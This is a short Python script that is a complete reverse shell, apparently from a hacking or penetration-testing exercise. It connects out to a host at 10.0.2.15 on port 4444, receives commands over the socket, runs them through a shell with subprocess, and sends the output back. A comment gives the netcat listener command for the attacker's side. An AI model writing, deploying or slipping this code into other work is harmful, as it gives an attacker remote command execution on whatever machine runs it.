#!/usr/bin/env python

import socket, subprocess, time

def execute_system_command(command):
	return subprocess.check_output(command, shell=True)

# nc -vv -l -p 4444
# establish connection
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("10.0.2.15", 4444))	# tuple

# time.sleep(10)

while True:
	command = connection.recv(1024) # batch 1024bytes
	command_result = execute_system_command(command) # whoami
	connection.send(command_result)

connection.close()